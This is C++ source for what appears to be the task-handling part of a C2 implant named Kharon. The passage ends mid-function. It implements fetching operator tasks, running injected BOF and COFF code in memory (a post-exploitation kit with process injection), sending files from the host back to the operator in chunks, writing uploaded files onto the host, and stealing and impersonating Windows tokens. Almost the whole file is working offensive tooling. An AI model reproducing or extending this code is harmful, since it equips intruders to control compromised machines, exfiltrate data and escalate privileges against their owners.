#include <Kharon.h>

using namespace Root;

auto DECLFN Task::Dispatcher( VOID ) -> VOID {
    KhDbg("[====== Starting Dispatcher ======]");
    KhDbg("Initial heap allocation count: %d", Self->Hp->Count);

    PACKAGE* Package  = nullptr;
    PARSER*  Parser   = nullptr;
    PVOID    DataPsr  = nullptr;
    UINT64   PsrLen   = 0;
    PCHAR    TaskUUID = nullptr;
    BYTE     JobID    = 0;
    ULONG    TaskQtt  = 0;

    auto FinalRoutine = [&]( VOID ) {
        if ( Self->Jbs->ExecuteAll() ) {
            Self->Jbs->Send( Self->Jbs->PostJobs );
        }

        Self->Jbs->Cleanup();

        if ( DataPsr ) {
            BOOL IsTracked = Self->Hp->CheckPtr( DataPsr );
            if ( IsTracked ) {
                KhFree( DataPsr );
            } else {
                KhDbg("WARNING: DataPsr not tracked, cannot free!");
            }
        }

        if ( Parser ) {
            Self->Psr->Destroy( Parser );
        }

        if ( Self->Jbs->PostJobs ) {
            Self->Pkg->Destroy( Self->Jbs->PostJobs );
        }

        if ( Package ) {
            Self->Pkg->Destroy( Package );
        }

        KhDbg("Final heap allocation count: %d", Self->Hp->Count);
        KhDbg("[====== Dispatcher Finished ======]\n");
    };

    Self->Jbs->PostJobs = Self->Pkg->PostJobs();
    Package = Self->Pkg->NewTask();
    if ( ! Package ) {
        KhDbg("ERROR: Failed to create new task package");
        return FinalRoutine();
    }

    Parser = (PARSER*)KhAlloc( sizeof(PARSER) );
    if ( ! Parser ) {
        KhDbg("ERROR: Failed to allocate parser memory");
        return FinalRoutine();
    }

    Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );

    if ( ! DataPsr || ! PsrLen ) {
        Self->Pkg->Int32( Self->Jbs->PostJobs, Self->Jbs->Count );
        KhDbg("Not received task");
        return FinalRoutine();
    }

    KhDbg("Received response %p [%d bytes]", DataPsr, PsrLen);

    Self->Psr->NewTask( Parser, DataPsr, PsrLen );
    if ( ! Parser->Original ) { return FinalRoutine(); }

    KhDbg("Parsed data %p [%d bytes]", Parser->Buffer, Parser->Length);

    JobID = Self->Psr->Byte( Parser );

    if ( JobID == (BYTE)(Action::Task::GetTask) ) {
        KhDbg("Processing job ID: %d", JobID);
        TaskQtt = Self->Psr->Int32( Parser );
        KhDbg("Task quantity received: %d", TaskQtt);

        if ( TaskQtt > 0 ) {
            if ( ! Self->Jbs->PostJobs ) {
                KhDbg("ERROR: Failed to create post jobs package");
                return FinalRoutine();
            }
 
            Self->Pkg->Int32( Self->Jbs->PostJobs, TaskQtt + Self->Jbs->Count );

            for ( ULONG i = 0; i < TaskQtt; i++ ) {
                TaskUUID = Self->Psr->Str( Parser, 0 );
                if ( ! TaskUUID ) {
                    KhDbg("WARNING: Invalid TaskUUID at index %d", i);
                    continue;
                }

                KhDbg("Creating job for task UUID: %s", TaskUUID);
                KhDbg(
                    "Parser state: %p, buffer: %p, length: %d", 
                    Parser, Parser->Buffer, Parser->Length
                );

                JOBS* NewJob = Self->Jbs->Create( TaskUUID, Parser );
                if ( ! NewJob ) {
                    KhDbg("WARNING: Failed to create job for task %d", i);
                    continue;
                }
            }
        } else {
            Self->Pkg->Int32( Self->Jbs->PostJobs, Self->Jbs->Count );
        }
    }

    return FinalRoutine();
}

auto DECLFN Task::Postex(
    _In_ JOBS* Job
) -> ERROR_CODE {
    KhDbg("[Task::Postex] ENTER - Job UUID: %s", Job->UUID);

    PARSER*  Parser  = Job->Psr;
    PACKAGE* Package = Job->Pkg;

    KhDbg("[Task::Postex] Parser: %p, Package: %p", Parser, Package);
    KhDbg("[Task::Postex] Parser->Buffer: %p, Parser->Length: %d", Parser ? Parser->Buffer : nullptr, Parser ? Parser->Length : 0);
    KhDbg("[Task::Postex] Parser Endian flag: %d", Self->Psr->Endian);

    ULONG SubCmd = Self->Psr->Int32( Parser );

    KhDbg("[Task::Postex] SubCmd: %d", SubCmd);

    Self->Pkg->Int32( Package, SubCmd );

    if ( !SubCmd ) SubCmd = Self->Postex.SubId;

    switch ( (Action::Postex)SubCmd ) {

    case Action::Postex::Inject: {
        KhDbg("[Task::Postex::Inject] ENTER");
        KhDbg("[Task::Postex::Inject] Parser before Bytes: Buffer=%p, Length=%d", Parser->Buffer, Parser->Length);

        ULONG BofLen  = 0;
        PBYTE BofData = Self->Psr->Bytes( Parser, &BofLen );

        KhDbg("[Task::Postex::Inject] BofData: %p, BofLen: %d, IsLoaded: %d", BofData, BofLen, Self->Postex.IsLoaded);

        if ( BofLen > 0 && !Self->Postex.IsLoaded ) {
            KhDbg("[Task::Postex::Inject] First time loading PostexKit");

            Self->Postex.Mapped = (COFF_MAPPED*)KhAlloc( sizeof(COFF_MAPPED) );

            if ( !Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
                KhDbg("[Task::Postex::Inject] ERROR: Failed to map BOF");
                Self->Pkg->Int32( Package, 0 );
                return KhGetError;
            }

            KhDbg("[Task::Postex::Inject] BOF mapped successfully");

            PCHAR symbols[] = {
                (PCHAR)"go_inject", (PCHAR)"go_poll",  (PCHAR)"go_kill",
                (PCHAR)"go_list",   (PCHAR)"go_cleanup"
            };

            PVOID* targets[] = {
                &Self->Postex.fn_inject, &Self->Postex.fn_poll,  &Self->Postex.fn_kill,
                &Self->Postex.fn_list,   &Self->Postex.fn_cleanup
            };

            for ( int i = 0; i < 5; i++ ) {
                *targets[i] = Self->Cf->FindSymbol( Self->Postex.Mapped, symbols[i] );
            }

            KhDbg("[Task::Postex::Inject] Symbols: inject=%p, poll=%p, kill=%p, list=%p, cleanup=%p",
                Self->Postex.fn_inject, Self->Postex.fn_poll, Self->Postex.fn_kill,
                Self->Postex.fn_list, Self->Postex.fn_cleanup);

            Self->Postex.IsLoaded = TRUE;
            KhDbg("PostexKit loaded, poll job created");
        }

        if ( !Self->Postex.IsLoaded || !Self->Postex.fn_inject ) {
            KhDbg("[Task::Postex::Inject] ERROR: Not loaded or fn_inject is null (IsLoaded=%d, fn_inject=%p)",
                Self->Postex.IsLoaded, Self->Postex.fn_inject);
            Self->Pkg->Int32( Package, 0 );
            return KhGetError;
        }

        ULONG ArgsLen = 0;
        PBYTE Args    = (PBYTE)Self->Psr->Bytes( Parser, &ArgsLen );

        KhDbg("[Task::Postex::Inject] Calling go_inject with Args=%p, ArgsLen=%d", Args, ArgsLen);

        ((BOOL(*)(char*, int))Self->Postex.fn_inject)( (char*)Args, ArgsLen );

        KhDbg("[Task::Postex::Inject] go_inject returned");
        Self->Pkg->Int32( Package, 1 );

        Self->Postex.SubId = (INT32)Action::Postex::Poll;
        Job->Clean = FALSE;
        break;
    }

    case Action::Postex::Poll: {
        KhDbg("[Task::Postex::Poll] ENTER (IsLoaded=%d, fn_poll=%p)", Self->Postex.IsLoaded, Self->Postex.fn_poll);

        if ( !Self->Postex.IsLoaded || !Self->Postex.fn_poll ) {
            KhDbg("[Task::Postex::Poll] Not loaded, marking job for cleanup");
            Job->Clean = TRUE;
            return KhRetSuccess;
        }

        KhDbg("[Task::Postex::Poll] Calling go_poll");

        BOOL clean = ((BOOL(*)(char*, int))Self->Postex.fn_poll)( nullptr, 0 );

        KhDbg("[Task::Postex::Poll] go_poll returned to clean %s", clean ? "TRUE" : "FALSE");

        if ( clean ) {
            Self->Cf->Unmap( Self->Postex.Mapped );
            KhFree( Self->Postex.Mapped );
            Mem::Zero( (UPTR)&Self->Postex, sizeof(Self->Postex) );

            Job->Clean = TRUE;
            KhDbg("PostexKit unloaded, no active postex");
        } else {
            Job->Clean = FALSE;
        }
        break;
    }

    case Action::Postex::Kill:
    case Action::Postex::List:
    case Action::Postex::Cleanup: {
        KhDbg("[Task::Postex::%s] ENTER", 
            SubCmd == (ULONG)Action::Postex::Kill ? "Kill" : 
            SubCmd == (ULONG)Action::Postex::List ? "List" : "Cleanup");

        PVOID fn = nullptr;

        switch ( (Action::Postex)SubCmd ) {
            case Action::Postex::Kill:    fn = Self->Postex.fn_kill;    break;
            case Action::Postex::List:    fn = Self->Postex.fn_list;    break;
            case Action::Postex::Cleanup: fn = Self->Postex.fn_cleanup; break;
            default: break;
        }

        if ( !Self->Postex.IsLoaded || !fn ) {
            KhDbg("[Task::Postex] ERROR: Not loaded or fn is null");
            return KhGetError;
        }

        PBYTE Args    = (SubCmd == (ULONG)Action::Postex::Kill) ? (PBYTE)Parser->Buffer : nullptr;
        ULONG ArgsLen = (SubCmd == (ULONG)Action::Postex::Kill) ? Parser->Length : 0;

        KhDbg("[Task::Postex] Calling subcmd %d with Args=%p, ArgsLen=%d", SubCmd, Args, ArgsLen);

        ((void(*)(char*, int))fn)( (char*)Args, ArgsLen );

        KhDbg("[Task::Postex] subcmd %d returned", SubCmd);
        break;
    }

    default: {
        KhDbg("[Task::Postex] ERROR: Unknown SubCmd: %d", SubCmd);
        break;
    }

    }

    KhDbg("[Task::Postex] EXIT");
    return KhRetSuccess;
}

auto DECLFN Task::ExecBof(
    _In_ JOBS* Job
) -> ERROR_CODE {
    BOOL Success = FALSE;

    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    ULONG BofLen   = 0;
    PBYTE BofBuff  = Self->Psr->Bytes( Parser, &BofLen );
    ULONG BofCmdID = Self->Psr->Int32( Parser );
    ULONG BofArgc  = 0;
    PBYTE BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );

    KhDbg("bof id  : %d", BofCmdID);
    KhDbg("bof args: %p [%d bytes]", BofArgs, BofArgc);

    Self->Pkg->Int32( Self->Pkg->Shared, BofCmdID );

    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );

    if ( Success ) {
        return KhRetSuccess;
    } else {
        return KhGetError;
    }
}

auto DECLFN Task::ProcessDownloads(
    _In_ JOBS* Job
) -> ERROR_CODE {

    PACKAGE* Package = Job->Pkg;

    KhDbg("Processing Downloads task");

    INT8  Index    = -1;
    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Down[i].FileID || ! Str::LengthA( Self->Tsp->Down[i].FileID ) ) {
            Index = i; break;
        }
    }

    if (Index == -1) {
        Job->Clean = TRUE;
        return KhRetSuccess;
    }

    FILE_DOWNLOAD_EVENT Events[30] = { 0 };
    ULONG StartEvtLen = 0;

	for (INT i = 0; i < 30; i++) {
        if ( Self->Tsp->Down[i].FileID && Str::LengthA( Self->Tsp->Down[i].FileID ) ) {

            if (Self->Tsp->Down[i].CurChunk > Self->Tsp->Down[i].TotalChunks) {
                KhDbg("SHOULD NEVER BE REACHED");
                Self->Tsp->Down[i].FileID = "";
                continue;
            }

            ULONG chunksize = Self->Tsp->Down[i].ChunkSize;
            ULONG Offset = (Self->Tsp->Down[i].CurChunk - 1) * Self->Tsp->Down[i].ChunkSize;
            KhDbg("Reading chunk %d/%d for file ID %s at offset %lu", Self->Tsp->Down[i].CurChunk, Self->Tsp->Down[i].TotalChunks, Self->Tsp->Down[i].FileID, Offset);

            ULONG Result = (ULONG)Self->Krnl32.SetFilePointer(
                Self->Tsp->Down[i].FileHandle,
                (LONG)Offset,   // low-order 32 bits
                NULL,           // high-order 32 bits (must be NULL for <4GB)
                FILE_BEGIN
            );

            BYTE* FileBuffer = B_PTR( KhAlloc( chunksize ) );
            ULONG BytesRead  = 0;

            if ( ! Self->Krnl32.ReadFile( Self->Tsp->Down[i].FileHandle, FileBuffer, chunksize, &BytesRead, 0 ) || BytesRead == 0 ) {
                CHAR* ErrorMsg = "Failed to read from file";
                KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);

                Self->Ntdll.NtClose( Self->Tsp->Down[i].FileHandle );
                KhFree(FileBuffer);

                Events[StartEvtLen].FileID = Self->Tsp->Down[i].FileID;
                Events[StartEvtLen].ErrorCode = 1;
                CHAR* Reason = "CHUNK_READ_ERROR";
                Events[StartEvtLen].Reason = Reason;
                StartEvtLen++;

                if ( Self->Tsp->Down[i].Path ) KhFree( Self->Tsp->Down[i].Path );
                Self->Tsp->Down[i].FileID = nullptr;
                Self->Tsp->Down[i].Path = nullptr;

                QuickErr( ErrorMsg );
                continue;
            }

            Events[StartEvtLen].FileID = Self->Tsp->Down[i].FileID;
            Events[StartEvtLen].ErrorCode = 0;
            Events[StartEvtLen].Data = FileBuffer;
            Events[StartEvtLen].DataLen = BytesRead;
            Events[StartEvtLen].CurChunk = Self->Tsp->Down[i].CurChunk;
            Events[StartEvtLen].TotalChunks = Self->Tsp->Down[i].TotalChunks;
            StartEvtLen++;

            BOOL IsFinalChunk = (Self->Tsp->Down[i].CurChunk == Self->Tsp->Down[i].TotalChunks);
            
            if ( ! IsFinalChunk ) {
                Self->Tsp->Down[i].CurChunk = Self->Tsp->Down[i].CurChunk + 1;
            } else {
                Self->Ntdll.NtClose(Self->Tsp->Down[i].FileHandle);
                
                if ( Self->Tsp->Down[i].Path ) KhFree( Self->Tsp->Down[i].Path );
                Self->Tsp->Down[i].FileID = nullptr;
                Self->Tsp->Down[i].Path = nullptr;
                Self->Tsp->DownloadTasksCount--;
            }
        }
    }

    Self->Pkg->Int32( Package, StartEvtLen );
    if( StartEvtLen == 0 ){
        Job->Clean = TRUE;
        return KhRetSuccess;
    }

    for (INT i = 0; i < StartEvtLen; i++) {
        if (Events[i].FileID && Str::LengthA(Events[i].FileID)) {
            Self->Pkg->Str(Job->Pkg, Events[i].FileID);
            Self->Pkg->Int32(Job->Pkg, Events[i].ErrorCode);

            if (Events[i].ErrorCode != 0) {
                KhDbg("Processing TaskPacking for - FileID: %s, Error code: %d", Events[i].FileID, Events[i].ErrorCode);
                Self->Pkg->Str(Job->Pkg, Events[i].Reason);
            } else {
                KhDbg("Processing TaskPacking for - FileID: %s, Error code: %d", Events[i].FileID, Events[i].ErrorCode);
                Self->Pkg->Int32(Job->Pkg, Events[i].DataLen);
                KhDbg("Data Length: %d", Events[i].DataLen);
                // KhDbg( "Job Package Bytes for FileID: %s",  Events[i].FileID);
                // for ( INT j = 0; j < Events[i].DataLen; j++ ) {
                //     KhDbg( "%02X ", (Events[i].Data)[j] );
                // }
                Self->Pkg->Bytes(Job->Pkg, Events[i].Data, Events[i].DataLen);
                Self->Pkg->Int32(Job->Pkg, Events[i].CurChunk);
                KhDbg("Current Chunk: %d", Events[i].CurChunk);
                Self->Pkg->Int32(Job->Pkg, Events[i].TotalChunks);
                KhDbg("Total Chunks: %d", Events[i].TotalChunks);
            }
        }
    }

    for (INT i = 0; i < StartEvtLen; i++) {
        if ( Events[i].Data && Events[i].ErrorCode == 0 ) {
            KhFree( Events[i].Data );
        }
        
        if ( Events[i].FileID && 
             (Events[i].ErrorCode != 0 || Events[i].CurChunk == Events[i].TotalChunks) ) {
            KhFree( Events[i].FileID );
        }
    }

    Job->Clean = FALSE;

    return KhRetSuccess;
}

auto DECLFN Task::Download(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package   = Job->Pkg;
    PARSER*  Parser    = Job->Psr;
    CHAR*    FileID    = nullptr;
    CHAR*    FilePath  = nullptr;
    ULONG    FileSize  = 0;
    ULONG    chunksize = 0x500000; // 5 MB

    FileID = Self->Psr->Str( Parser, 0 );
    if ( ! FileID || ! Str::LengthA( FileID ) ) {
        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        Self->Pkg->Str( Package, "INVALID_FILE_ID" ); // Reason

        QuickErr( "Invalid file ID" );
        return KhRetSuccess;
    }

    FilePath = Self->Psr->Str( Parser, 0 );
    KhDbg("Download file Path: %s", FilePath);

    if ( ! FilePath || ! Str::LengthA( FilePath ) ) {

        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        Self->Pkg->Str( Package, "INVALID_FILE_PATH" ); // Reason

        QuickErr( "Invalid file path" );
        return KhRetSuccess;
    }

    KhDbg("Download file path: %s", FilePath);

    HANDLE FileHandle = Self->Krnl32.CreateFileA( FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

    if ( FileHandle == INVALID_HANDLE_VALUE ) {
        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        Self->Pkg->Str( Package, "INVALID_FILE_HANDLE" ); // Reason

        QuickErr( "Failed to open file for reading" );
        return KhRetSuccess;
    }

    INT8  Index = -1;
    
    KhDbg("file id: %s", FileID);
    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Down[i].FileID || ! Str::LengthA( Self->Tsp->Down[i].FileID ) ) {
            Index = i; break;
        }
    }

    KhDbg("index: %d", Index);

    if ( Index == -1 ) {
        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        Self->Pkg->Str( Package, "MAX_DOWNLOADS_REACHED" ); // Reason

        QuickErr( "Maximum concurrent uploads (30) reached" );
        Self->Ntdll.NtClose( FileHandle );
        return KhRetSuccess;
    }
    
    FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );

    ULONG FileIDLen  = Str::LengthA( FileID );
    CHAR* FileIDCopy = (CHAR*)KhAlloc( FileIDLen + 1 );

    Str::CopyA( FileIDCopy, FileID );

    ULONG FilePathLen  = Str::LengthA( FilePath );
    CHAR* FilePathCopy = (CHAR*)KhAlloc( FilePathLen + 1 );

    Str::CopyA( FilePathCopy, FilePath );

    Self->Tsp->Down[Index].FileID      = FileIDCopy;
    Self->Tsp->Down[Index].ChunkSize   = chunksize; 
    Self->Tsp->Down[Index].CurChunk    = 1;
    Self->Tsp->Down[Index].TotalChunks = (FileSize + chunksize - 1) / chunksize;
    Self->Tsp->Down[Index].Path        = FilePathCopy;
    Self->Tsp->Down[Index].FileHandle  = FileHandle;

    Self->Tsp->DownloadTasksCount++;

    if ( Self->Tsp->DownloadTasksCount == 1 ) {
        KhDbg("Adding Process Downloads job");
        PARSER* TmpPsrDownload = nullptr;
        BYTE*   TmpBufDownload = (BYTE*)KhAlloc( sizeof(UINT16) );
        UINT16  CmdDownload    = (UINT16)Action::Task::ProcessDownloads;
        JOBS*   NewJobDownload = nullptr;
        // 4-byte big-endian length
        TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
        TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;

        TmpPsrDownload = (PARSER*)KhAlloc( sizeof(PARSER) );
        if ( ! TmpPsrDownload ) {         
            KhDbg("ERROR: Failed to create TmpParser");
            return KhGetError;
        }
    
        Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );

        KhFree( TmpBufDownload );
    
        NewJobDownload = Self->Jbs->Create( Self->Jbs->DownloadUUID, TmpPsrDownload, TRUE );
        if ( ! NewJobDownload ) {
            KhDbg("WARNING: Failed to create job for Process Download task");
            return KhGetError;
        }
    }

    Self->Pkg->Str( Package, FileID );
    Self->Pkg->Int32( Package, 0 ); 
    Self->Pkg->Int64( Package, FileSize );
    Self->Pkg->Str( Package, FilePath );

    return KhRetSuccess;  
}

auto DECLFN Task::Upload(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;
    
    CHAR* FileID   = nullptr;
    CHAR* FilePath = nullptr;
    INT8  Index    = -1;

    Action::Up UploadState = (Action::Up)Self->Psr->Int32( Parser );

    KhDbg("Upload state: %d", UploadState);

    switch ( UploadState ) {
        case Action::Up::Init: {
            FileID = Self->Psr->Str( Parser, 0 );
            KhDbg("file id: %s", FileID);
            for ( INT i = 0; i < 30; i++ ) {
                if ( ! Self->Tsp->Up[i].FileID || ! Str::LengthA( Self->Tsp->Up[i].FileID ) ) {
                    Index = i; break;
                }
            }

            KhDbg("index: %d", Index);

            if (Index == -1) {
                CHAR* ErrorMsg = "Maximum concurrent uploads (10) reached";
                KhDbg("%s", ErrorMsg);
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }
            KhDbg("index: %d", Index);

            FilePath = Self->Psr->Str(Parser, 0);

            KhDbg("file path: %s", FilePath);

            Self->Tsp->Up[Index].FileID = FileID;
            Self->Tsp->Up[Index].Path   = FilePath;
            Self->Tsp->Up[Index].CurChunk = 0;
            Self->Tsp->Up[Index].BytesReceived = 0;
            Self->Tsp->Up[Index].TotalChunks = 0; 

            Self->Pkg->Int32( Package, 1 ); // Start with chunk 1
            Self->Pkg->Str( Package, FileID );
            Self->Pkg->Str( Package, FilePath );
            Self->Pkg->Int32( Package, KH_CHUNK_SIZE );

            KhDbg("Init upload: ID=%s, Path=%s", FileID, FilePath);

            break;
        }
        case Action::Up::Chunk: {
            FileID = Self->Psr->Str( Parser, 0 );
            KhDbg("file id: %s", FileID);
            if ( ! FileID ) {
                CHAR* ErrorMsg = "Invalid File ID"; KhDbg("%s", ErrorMsg); 
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }

            INT32 TotalChunks = Self->Psr->Int32( Parser );
            INT32 ChunkNumber = Self->Psr->Int32( Parser );
            INT32 ChunkSize   = Self->Psr->Int32( Parser );
            BYTE* ChunkData   = Self->Psr->Bytes( Parser, 0 );

            KhDbg("total: %d", TotalChunks);
            KhDbg("chunk number: %d", ChunkNumber);
            KhDbg("chunk size: %d", ChunkSize);
            KhDbg("chunk data p:  %p", ChunkData);

            INT FileIndex = -1;
            for ( INT i = 0; i < 30; i++ ) {
                if ( 
                    Self->Tsp->Up[i].FileID && 
                    Str::CompareA( FileID, Self->Tsp->Up[i].FileID ) == 0
                ) { FileIndex = i; break; }
            }

            if ( FileIndex == -1 ) {
                CHAR* ErrorMsg = "File ID not found";
                KhDbg("%s", ErrorMsg);
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }

            KhDbg("FIleIndex: %d", FileIndex);

            if (
                ! Self->Tsp->Up[FileIndex].FileHandle || Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE
            ) {
                Self->Tsp->Up[FileIndex].FileHandle = Self->Krnl32.CreateFileA(
                    Self->Tsp->Up[FileIndex].Path, FILE_APPEND_DATA,
                    FILE_SHARE_READ, nullptr, OPEN_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, nullptr
                );
                KhDbg("Created File Handle");
                

                if (Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE) {
                    CHAR* ErrorMsg = "Failed to create/open file";
                    KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                    QuickErr( ErrorMsg );
                    return KhRetSuccess;
                }
            }

            Self->Krnl32.SetFilePointer(
                Self->Tsp->Up[FileIndex].FileHandle,
                0, nullptr, FILE_END
            );

            DWORD bytesWritten;
            BOOL  writeResult = Self->Krnl32.WriteFile(
                Self->Tsp->Up[FileIndex].FileHandle,
                ChunkData, ChunkSize, &bytesWritten, nullptr
            );
            KhDbg("bytesWritten: %lu", bytesWritten);
            KhDbg("writeResult: %d", writeResult);

            if ( ! writeResult || bytesWritten != ChunkSize ) {
                CHAR* ErrorMsg = "Failed to write chunk to file";
                KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                QuickErr( ErrorMsg );
                
                if ( Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE ) {
                    Self->Ntdll.NtClose( Self->Tsp->Up[FileIndex].FileHandle );
                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
                }
                
                return KhRetSuccess;
            }

            Self->Tsp->Up[FileIndex].CurChunk       = ChunkNumber;
            Self->Tsp->Up[FileIndex].BytesReceived += bytesWritten;
            Self->Tsp->Up[FileIndex].TotalChunks    = TotalChunks;

            KhDbg("Chunk %d/%d (%d bytes) written to %s", 
                ChunkNumber, TotalChunks, bytesWritten, FileID);

            if ( ChunkNumber == TotalChunks || ChunkSize < KH_CHUNK_SIZE ) {
                QuickMsg(
                    "Upload completed: %s (%d bytes total)", 
                    FileID, Self->Tsp->Up[FileIndex].BytesReceived 
                );

                if ( Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE ) {
                    Self->Ntdll.NtClose( Self->Tsp->Up[FileIndex].FileHandle );
                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
                }

                if ( Self->Tsp->Up[FileIndex].FileID ) {
                    KhFree( Self->Tsp->Up[FileIndex].FileID );
                    Self->Tsp->Up[FileIndex].FileID = nullptr;
                }
                
                if ( Self->Tsp->Up[FileIndex].Path ) {
                    KhFree( Self->Tsp->Up[FileIndex].Path );
                    Self->Tsp->Up[FileIndex].Path = nullptr;
                }
                Self->Tsp->Up[FileIndex].FileID = "";
                Self->Tsp->Up[FileIndex].CurChunk = 0;
                Self->Tsp->Up[FileIndex].BytesReceived = 0;
                Self->Tsp->Up[FileIndex].TotalChunks = 0;
            }

            break;
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::Pivot(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8 SubCmd = Self->Psr->Byte( Parser );

    KhDbg( "sub command id: %d", SubCmd );

    Self->Pkg->Byte( Package, SubCmd );    

    switch ( (Action::Pivot)SubCmd ) {
        case Action::Pivot::List: {

        }
        case Action::Pivot::Link: {

        }
        case Action::Pivot::Unlink: {

        }
    }
    
    return KhRetSuccess;
}

auto DECLFN Task::Token(
    _In_ JOBS* Job
) -> ERROR_CODE {    
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    Action::Token SubID = (Action::Token)Self->Psr->Int32( Parser );

    Self->Pkg->Byte( Package, (BYTE)SubID );
    KhDbg( "Sub Command ID: %d", SubID );

    switch ( SubID ) {
        case Action::Token::GetUUID: {
            CHAR*  ThreadUser  = nullptr;
            HANDLE TokenHandle = nullptr;

            TokenHandle = Self->Tkn->CurrentPs();            
            if ( ! TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                KhDbg("Invalid token!");
                KhSetError( ERROR_INVALID_HANDLE );
                break;
            }

            ThreadUser = Self->Tkn->GetUser( TokenHandle );
            
            if ( ThreadUser ) {
                Self->Pkg->Str( Package, ThreadUser );
                KhFree( ThreadUser ); KhSetError( ERROR_SUCCESS );
            } else {
                KhSetError( ERROR_NO_TOKEN );
            }

            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        case Action::Token::List: {
            TOKEN_NODE* Current = Self->Tkn->Node;
            ULONG count = 0;

            while ( Current ) {
                count++;
                KhDbg("Linsting token %d:", count);
                KhDbg("  User: %s", Current->User ? Current->User : "NULL");
                KhDbg("  Host: %s", Current->Host? Current->Host : "NULL");
                KhDbg("  TokenID: %d", Current->TokenID);
                KhDbg("  Handle: %p", Current->Handle);
                KhDbg("  ProcessID: %d", Current->ProcessID);
                
                Self->Pkg->Str( Package, Current->User ? Current->User : (CHAR*)"" );
                Self->Pkg->Str( Package, Current->Host ? Current->Host : (CHAR*)"" );
                Self->Pkg->Int32( Package, Current->TokenID );
                Self->Pkg->Int64( Package, (LONG)Current->Handle );
                Self->Pkg->Int32( Package, Current->ProcessID );

                Current = Current->Next;
            }
            
            break;
        }
        case Action::Token::Steal: {            
            ULONG ProcessID = Self->Psr->Int32( Parser );
            BOOL  TokenUse  = Self->Psr->Int32( Parser );

            KhDbg("[Task::Token::Steal] ProcessID: %d, TokenUse: %s", ProcessID, TokenUse ? "true" : "false");
            
            TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );

            if ( ! Token ) {
                Self->Pkg->Int32( Package, FALSE );
                break;
            }

            Self->Pkg->Int32( Package, TRUE );
            Self->Pkg->Int32( Package, Token->TokenID );
            Self->Pkg->Int32( Package, Token->ProcessID );
            Self->Pkg->Str( Package, Token->User ? Token->User : (CHAR*)"" );
            Self->Pkg->Str( Package, Token->Host ? Token->Host : (CHAR*)"" );
            Self->Pkg->Int64( Package, (INT64)Token->Handle );

            KhDbg( "[+] Token ID: %d", Token->TokenID );
            KhDbg( "[+] Process ID: %d", Token->ProcessID );
            KhDbg( "[+] User Name: %s", Token->User ? Token->User : "NULL" );
            KhDbg( "[+] Host Name: %s", Token->Host ? Token->Host : "NULL" );
            KhDbg( "[+] Handle: %p", Token->Handle );

            if ( TokenUse ) {
                if ( Self->Tkn->Use( Token->Handle ) ) {
                    KhDbg("Token impersonated successfully");
                } else {
                    KhDbg("Failed to impersonate token: %d", KhGetError);
                }
            } else {
                KhDbg("TokenUse=false, not impersonated");
            }

            break;
        }
        case Action::Token::Impersonate: {
            ULONG TokenID = Self->Psr->Int32( Parser );
            KhDbg("Impersonating Token ID: %d", TokenID);

            TOKEN_NODE* TokenObj = Self->Tkn->GetByID( TokenID );

            if ( !TokenObj ) {
                KhDbg("Token ID %d not found", TokenID);
                Self->Pkg->Int32( Package, FALSE );
                KhSetError( ERROR_NOT_FOUND );
                break;
            }

            BOOL result = Self->Tkn->Use( TokenObj->Handle );
            KhDbg("Impersonate Result: %s", result ? "SUCCESS" : "FAILED");

            Self->Pkg->Int32( Package, result );

            break;
        }
        case Action::Token::Remove: {            
            ULONG TokenID = Self->Psr->Int32( Parser );
            BOOL  result  = Self->Tkn->Rm( TokenID );
            
            Self->Pkg->Int32( Package, result );
            
            break;
        }
        case Action::Token::Revert: {            
            BOOL result = Self->Tkn->Rev2Self();
            Self->Pkg->Int32( Package, result );
            
            break;
        }
        case Action::Token::Make: {
            KhDbg("[Task::Token] Comando: Make");
            
            CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
            CHAR*  Password    = Self->Psr->Str( Parser, 0 );
            CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
            HANDLE TokenHandle = nullptr;

            KhDbg("User   Name: %s", UserName ? UserName : "NULL");
            KhDbg("Domain Name: %s", DomainName ? DomainName : "NULL");
            KhDbg("Attempting logon: %s\\%s", DomainName ? DomainName : ".", UserName);

